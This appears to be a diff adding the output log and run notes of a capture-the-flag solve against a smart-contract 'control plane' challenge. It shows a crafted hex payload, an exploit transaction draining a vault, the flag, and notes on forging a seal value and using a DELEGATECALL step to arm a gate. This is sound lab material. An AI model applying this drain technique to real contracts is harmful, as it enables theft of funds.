@@ -1,0 +1,24 @@
+$ python3 solve.py https://control-plane-115c69b20328.chals.z0d1ak.org
+
+kernel=0x25B8cA683Eda8a72972D78Ea993b694117403A14 vault=0x60D9D5DecA8f1d4CB67353fd0f488A6B22ddF577 telemetry=0xae47c8e0771Ceec198CEb748873662e63870e3DC
+player=0x851105320BD59f6d94023c701A5F0433280f5182 vault_balance=100000000000000000000
+ticket=431e38469c72f97f4aa548f2f434a2ac
+program=310301120001002d003901ae47c8e0771ceec198ceb748873662e63870e3dc3852f4b0e796b6329f2bba89eaf6dbcb7f1722771f67c3b954bcf49dfe06ae82f86f0c1a2d00c00260d9d5deca8f1d4cb67353fd0f488a6b22ddf5773c5e9fec000000000000000000000000851105320bd59f6d94023c701a5f0433280f51820000000000000000000000000000000000000000000000056bc75e2d63100000431e38469c72f97f4aa548f2f434a2ac000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+exploit tx 6133dd2d421bfebea16bae1b09d011d8f6040288a31d0cc5b672cccfa7d57ee2 status=1 gas=92824
+isSolved=True
+FLAG: {'flag': 'zdk{ENDIan_fIREw4l1_d3L3gA7e_DRaIN}'}
+
+--------------------------------------------------------------------------------
+Notes captured during the live run
+--------------------------------------------------------------------------------
+* kernel seal (mode-2 gate value) for this instance:
+      keccak256(kernel || vault || chainid) XOR C
+      = e796b6329f2bba89eaf6dbcb7f1722771f67c3b954bcf49dfe06ae82f86f0c1a
+* kernel storage read via the public getters (eth_getStorageAt is blocked, 403):
+      vault()   0xfbfa77cf -> 0x...60d9d5deca8f1d4cb67353fd0f488a6b22ddf577   (slot 0)
+      operator()0x570ca735 -> 0x...30c8106202e6e28e4159684ad714b63f955d0cab   (slot 1)
+      slot2     0x194aac9c -> 0x0000...0000                                    (slot 2, == 0)
+      isModule(vault) 0xa8ee49fe(vault) -> 0x0000...0000  (vault NOT registered)
+* The first attempt (single mode-2 record, assuming slot2 already held the seal)
+  reverted with status 0 -- the live kernel starts with slot2 == 0, which is why
+  the DELEGATECALL-first (rotate) step is required to arm the gate.
